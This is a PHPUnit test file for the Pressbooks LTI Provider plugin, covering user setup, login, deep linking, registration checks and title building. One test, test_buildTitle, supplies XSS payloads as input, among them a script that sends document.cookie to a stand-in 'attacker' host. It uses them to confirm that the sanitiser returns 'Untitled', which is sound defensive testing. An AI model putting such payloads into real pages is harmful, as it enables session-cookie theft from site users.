<?php

class ToolTest extends \WP_UnitTestCase {

	use utilsTrait;

	/**
	 * @var \PressbooksLtiProvider\Tool
	 */
	protected $tool;

	/**
	 * @return \PressbooksLtiProvider\Admin
	 */
	protected function getMockAdmin() {

		$stub1 = $this
			->getMockBuilder( '\PressbooksLtiProvider\Admin' )
			->getMock();
		$stub1
			->method( 'getSettings' )
			->willReturn(
				[
					'whitelist' => "pressbooks.test\r\nnpressbooks.education\r\n",
					'prompt_for_authentication' => 0,
					'book_override' => 1,
					'admin_default' => 'subscriber',
					'staff_default' => 'subscriber',
					'learner_default' => 'subscriber',
					'hide_navigation' => 0,
				]
			);
		$stub1
			->method( 'getBookSettings' )
			->willReturn(
				[
					'admin_default' => 'subscriber',
					'staff_default' => 'subscriber',
					'learner_default' => 'subscriber',
					'hide_navigation' => 0,
				]
			);
		return $stub1;
	}

	/**
	 *
	 */
	public function setUp() {
		parent::setUp();
		$connector = PressbooksLtiProvider\Database::getConnector();
		$tool = new PressbooksLtiProvider\Tool( $connector );
		$tool->setAdmin( $this->getMockAdmin() );
		$this->tool = $tool;
	}

	public function test_getters_and_setters() {
		$this->tool->setAction( 'a' );
		$this->assertEquals( 'a', $this->tool->getAction() );
		$this->tool->setParams( [ 'b' ] );
		$this->assertEquals( [ 'b' ], $this->tool->getParams() );
	}

	public function test_relativeBookIconUrl() {
		$url = $this->tool->relativeBookIconUrl();
		$this->assertStringEndsWith( 'book.png', $url );
	}

	public function test_initSessionVars() {
		$this->tool->initSessionVars();
		$this->assertTrue( array_key_exists( 'pb_lti_return_url', $_SESSION ) );
	}

	public function test_setupUser() {
		$this->_book();
		$prefix = uniqid( 'test' );
		$email = "{$prefix}@pressbooks.test";

		$guid = rand();
		$user = new \IMSGlobal\LTI\ToolProvider\User();
		$user->ltiUserId = 1;
		$user->setEmail( $email );
		$user->roles = [ 'urn:lti:role:ims/lis/Administrator' ];
		$lti_id = "{$guid}|" . $user->getId();

		// User doesn't exist yet
		$this->assertFalse( $this->tool->matchUserById( $lti_id ) );

		$this->tool->setupUser( $user, $guid );
		$user = get_user_by( 'email', $email );
		$this->assertInstanceOf( '\WP_User', $user );
		$this->assertEquals( $prefix, $user->user_login );
		$this->assertTrue( is_user_member_of_blog( $user->ID ) );

		// User was created and linked
		$this->assertInstanceOf( '\WP_User', $this->tool->matchUserById( $lti_id ) );
	}

	public function test_authenticateUser() {
		$user = $this->factory()->user->create_and_get( [ 'role' => 'contributor' ] );
		$this->tool->authenticateUser( $user, '1:2:3', false, 'subscriber' );
		/** @var \PressbooksLtiProvider\Entities\Storage $storage */
		$storage = $_SESSION['pb_lti_prompt_for_authentication'];
		$this->assertEquals( $storage->user->ID, $user->ID );
		$this->assertEquals( $storage->user->nickname, $user->nickname );
		$this->assertEquals( $storage->ltiId, '1:2:3' );
		$this->assertEquals( $storage->ltiIdWasMatched, false );
		$this->assertEquals( $storage->role, 'subscriber' );
		unset( $_SESSION['pb_lti_prompt_for_authentication'] );
	}

	public function test_loginUser() {
		$user = $this->factory()->user->create_and_get( [ 'role' => 'contributor' ] );
		$this->assertEmpty( wp_get_current_user()->ID );

		// Login user, $lti_id_was_matched true (don't link account)
		$this->tool->loginUser( $user, '1:2:3', true, 'subscriber' );
		$this->assertEquals( wp_get_current_user()->ID, $user->ID );
		$this->assertEmpty( get_user_meta( $user->ID, \PressbooksLtiProvider\Tool::META_KEY ) );

		// Login user, $lti_id_was_matched false (link account)
		$this->tool->loginUser( $user, '1:2:3', false, 'subscriber' );
		$this->assertNotEmpty( wp_get_current_user()->ID, $user->ID );
	}

	public function test_setupDeepLink() {
		$this->_book();
		$this->tool->setParams( [ 'back-matter', 'appendix' ] );
		$this->tool->setupDeepLink();
		$this->assertContains( 'http', $this->tool->getRedirectUrl() );
	}

	public function test_renderContentItemForm() {
		$buffer = $this->tool->renderContentItemForm( 'https://pressbooks.test' );
		$this->assertContains( '</form>', $buffer );
	}

	public function test_renderRegisterForm() {
		$buffer = $this->tool->renderRegisterForm( 'https://pressbooks.test/yes', 'https://pressbooks.test/no' );
		$this->assertContains( '</html>', $buffer );
	}

	public function test_validateRegistrationRequest() {
		$this->assertTrue( $this->tool->validateRegistrationRequest() );

		$_POST['lti_message_type'] = 'ToolProxyRegistrationRequest';
		$this->assertFalse( $this->tool->validateRegistrationRequest() );

		$_POST['tc_profile_url'] = 'https://pressbooks.test/path/to/something';
		$this->assertTrue( $this->tool->validateRegistrationRequest() );

		$_POST['tc_profile_url'] = 'https://hotmail.com/path/to/something';
		$this->assertFalse( $this->tool->validateRegistrationRequest() );
	}

	public function test_maybeDisambiguateDomain() {
		$subdomain_happy_path    = 'https://biology201.example.com/';
		$subdirectory_happy_path = 'https://example.com/biol201';
		$empty_path              = 'blort@example.com';
		$exists_path = 'https://example.org/';

		$this->assertEquals( 'https://biology201.example.com', $this->tool->maybeDisambiguateDomain( $subdomain_happy_path ) );
		$this->assertEquals( 'https://example.com/biol201', $this->tool->maybeDisambiguateDomain( $subdirectory_happy_path ) );
		$this->assertEmpty( $this->tool->maybeDisambiguateDomain( $empty_path ) );
		$this->assertEquals( 'https://example.org/1', $this->tool->maybeDisambiguateDomain( $exists_path ) );

	}

	public function test_buildTitle() {
		$happy_path     = [ 'Course Name 657', '2352', 'Read this book!', '8932' ];
		$empty_path1    = [ '', '4321', '', '1234' ];
		$empty_path2    = [ 'BIO-201:microbiology', '4321', '', '1234' ];
		$markup_path    = [ '<b>Course Name 657</b>', '2352', '<span>Read this</span> book!', '8765' ];
		$malicious_path = [
			'<script>window.location=\'http://attacker/?cookie=\'+document.cookie</script>',
			'<script>var keyword = location.search.substring(6);document.querySelector("em").innerHTML=keyword;)</script>',
			'<script>bad.js</script>',
			'123'
		];
		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $happy_path[0], $happy_path[1], $happy_path[2], $happy_path[3] ) );
		$this->assertEquals( 'Course ID 4321: Activity ID 1234', $this->tool->buildTitle( $empty_path1[0], $empty_path1[1], $empty_path1[2], $empty_path1[3] ) );
		$this->assertEquals( 'BIO-201:microbiology: Activity ID 1234', $this->tool->buildTitle( $empty_path2[0], $empty_path2[1], $empty_path2[2], $empty_path2[3] ) );
		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $markup_path[0], $markup_path[1], $markup_path[2], $markup_path[3] ) );
		$this->assertEquals( 'Untitled', $this->tool->buildTitle( $malicious_path[0], $malicious_path[1], $malicious_path[2], $malicious_path[3] ) );
	}

	public function test_validateLtiBookExists() {
		update_option( 'pressbooks_lti_consumer_context', [ 'resource_link_id' => 33 ] );
		$no_exist          = [ 'https://pressbooks.test/activityname', 33 ];
		$no_url            = [ 'noHostHere', 33 ];
		$happy_path_no_lti = [ 'https://example.org', 34 ];
		$happy_path        = [ 'https://example.org', 33 ];

		$this->assertFalse( $this->tool->validateLtiBookExists( $no_exist[0], $no_exist[1] ) );
		$this->assertFalse( $this->tool->validateLtiBookExists( $no_url[0], $no_url[1] ) );
		$this->assertFalse( $this->tool->validateLtiBookExists( $happy_path_no_lti[0], $happy_path_no_lti[1] ) );
		$this->assertTrue( $this->tool->validateLtiBookExists( $happy_path[0], $happy_path[1] ) );

	}
}
